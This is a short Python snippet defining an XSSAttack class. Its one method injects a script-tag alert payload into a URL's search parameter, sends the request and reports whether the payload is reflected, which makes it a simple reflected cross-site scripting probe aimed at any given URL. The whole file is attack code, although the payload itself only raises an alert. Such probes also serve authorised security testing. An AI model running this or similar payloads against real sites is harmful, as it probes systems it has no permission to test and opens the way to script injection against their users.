class XSSAttack:
    def __init__(self):
        pass

    def perform_xss_attack(self, url):
        payload = "<script>alert('XSS Attack!')</script>"
        xss_url = f"{url}?search={payload}"
        response = requests.get(xss_url)
        if payload in response.text:
            print(f"XSS attack successful on: {xss_url}")
        else:
            print(f"XSS attack failed on: {xss_url}")
